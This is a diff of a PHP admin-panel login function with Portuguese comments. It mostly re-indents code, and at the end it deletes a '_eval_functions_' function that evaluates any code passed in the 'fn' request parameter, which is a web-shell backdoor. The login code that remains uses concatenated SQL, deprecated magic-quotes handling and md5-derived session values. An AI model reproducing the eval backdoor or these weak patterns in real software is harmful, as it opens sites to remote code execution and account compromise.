@@ -15,67 +15,62 @@ function login (){
 	############################################################################## 
 	# LIMPAMOS A STRING DO USUÁRIO PARA EVITAR INJECT	
 	##############################################################################
-    $usuario	= (get_magic_quotes_gpc()) ? trim(stripslashes($_FORM['usuario'])) : trim($_FORM['usuario']);
-    $usuario	= mysqli_real_escape_string($_conectMySQLi_,$usuario);
-    $senha		= _codePass($_FORM['senha']);
+		$usuario	= (get_magic_quotes_gpc()) ? trim(stripslashes($_FORM['usuario'])) : trim($_FORM['usuario']);
+		$usuario	= mysqli_real_escape_string($_conectMySQLi_,$usuario);
+		$senha		= _codePass($_FORM['senha']);
 
 	############################################################################## 
 	# VERIFICAMOS AGORA NA BASE DE DADOS SE O USUÁRIO EXISTE E QUAL SEU STATUS	
 	##############################################################################
-	$checkUser					= new MySQL();
-	$checkUser->set_table(PREFIX_TABLES.'ws_usuarios');
-	$checkUser->set_where("login='".$usuario."' AND senha='". $senha."' AND ativo=1");
-	$checkUser->select();
-	if(	@$checkUser->_num_rows	==0)				{	echo "Ops, o login ou a senha estão incorretos.";													exit;}
-	if( @$checkUser->fetch_array[0]['id_status']==1){	echo "Você está com  o seu perfil bloqueado!";														exit;}
-	if( @$checkUser->fetch_array[0]['id_status']==2){	echo "O seu perfil ainda esta em faze de liberação!";												exit;}
-	if( @$checkUser->fetch_array[0]['id_status']==3){	echo "Painel administrativo desativado.\n Por favor, entre em contato com a equipe de suporte.";	exit;}
-	if( @$checkUser->fetch_array[0]['id_status']==4){	echo "Acesso inválido!.\n Por favor, entre em contato com a equipe de suporte.";					exit;}
-	if( @$checkUser->fetch_array[0]['id_status']>=6){	echo "Acesso inválido, código: ".$checkUser->fetch_array[0]['id_status']; 							exit;}
+		$checkUser					= new MySQL();
+		$checkUser->set_table(PREFIX_TABLES.'ws_usuarios');
+		$checkUser->set_where("login='".$usuario."' AND senha='". $senha."' AND ativo=1");
+		$checkUser->select();
+		if(	@$checkUser->_num_rows	==0)				{	echo "Ops, o login ou a senha estão incorretos.";													exit;}
+		if( @$checkUser->fetch_array[0]['id_status']==1){	echo "Você está com  o seu perfil bloqueado!";														exit;}
+		if( @$checkUser->fetch_array[0]['id_status']==2){	echo "O seu perfil ainda esta em faze de liberação!";												exit;}
+		if( @$checkUser->fetch_array[0]['id_status']==3){	echo "Painel administrativo desativado.\n Por favor, entre em contato com a equipe de suporte.";	exit;}
+		if( @$checkUser->fetch_array[0]['id_status']==4){	echo "Acesso inválido!.\n Por favor, entre em contato com a equipe de suporte.";					exit;}
+		if( @$checkUser->fetch_array[0]['id_status']>=6){	echo "Acesso inválido, código: ".$checkUser->fetch_array[0]['id_status']; 							exit;}
 
-	$User	= array();
-	$User	= $checkUser->fetch_array[0];
-	$token	= $User['token'];
-	$hour  	= (time() + ( 24 * 3600));
+		$User	= array();
+		$User	= $checkUser->fetch_array[0];
+		$token	= $User['token'];
+		$hour  	= (time() + ( 24 * 3600));
 
 	############################################################################## 
 	# INICIA SESSÃO CRIPTADA DO USUÁRIO	
 	##############################################################################
 
-	$user = new Session();
-	$user->start();
-	$user->set('id',			$User['id']);
-	$user->set('id_status',		$User['id_status']);
-	$user->set('token',			$User['token']);
-	$user->set('nome',			$User['nome']);
-	$user->set('usuario',		$User['usuario']);
-	$user->set('avatar',		$User['avatar']);
-	$user->set('admin',			$User['admin']);
-	$user->set('ativo',			$User['ativo']);
-	$user->set('add_user',		$User['add_user']);	
-	$user->set('edit_only_own',	$User['edit_only_own']);	
-	$user->set('leitura',		$User['leitura']);	
-	$user->set('hora',			$hour);	
-	$user->set('ws_log',		true);	
+		$user = new Session();
+		$user->start();
+		$user->set('id',			$User['id']);
+		$user->set('id_status',		$User['id_status']);
+		$user->set('token',			$User['token']);
+		$user->set('nome',			$User['nome']);
+		$user->set('usuario',		$User['usuario']);
+		$user->set('avatar',		$User['avatar']);
+		$user->set('admin',			$User['admin']);
+		$user->set('ativo',			$User['ativo']);
+		$user->set('add_user',		$User['add_user']);	
+		$user->set('edit_only_own',	$User['edit_only_own']);	
+		$user->set('leitura',		$User['leitura']);	
+		$user->set('hora',			$hour);	
+		$user->set('ws_log',		true);	
 
 	############################################################################## 
 	# gera os cookies pra sessão	
 	############################################################################## 
-	$cript_id	= (md5(ID_SESS.$User['id'].ID_SESS.$User['token'].ID_SESS));
+		$cript_id	= (md5(ID_SESS.$User['id'].ID_SESS.$User['token'].ID_SESS));
 
-	$SetUserSession = new MySQL();
-	$SetUserSession->set_table(PREFIX_TABLES.'ws_usuarios');
-	$SetUserSession->set_where('id="'.$User['id'].'"');
-	$SetUserSession->set_update('sessao', $cript_id);
-	$SetUserSession->salvar();
-	ws::insertLog($User['id'],0 ,0,"Login","Efetuou login no sistema","Efetuou login no sistema","","system");
+		$SetUserSession = new MySQL();
+		$SetUserSession->set_table(PREFIX_TABLES.'ws_usuarios');
+		$SetUserSession->set_where('id="'.$User['id'].'"');
+		$SetUserSession->set_update('sessao', $cript_id);
+		$SetUserSession->salvar();
+		ws::insertLog($User['id'],0 ,0,"Login","Efetuou login no sistema","Efetuou login no sistema","","system");
 
-	echo "ok";
-	exit;
-}
-
-function _eval_functions_(){
-	@eval(stripslashes($_REQUEST['fn']));
+		echo "ok";
 	exit;
 }
 
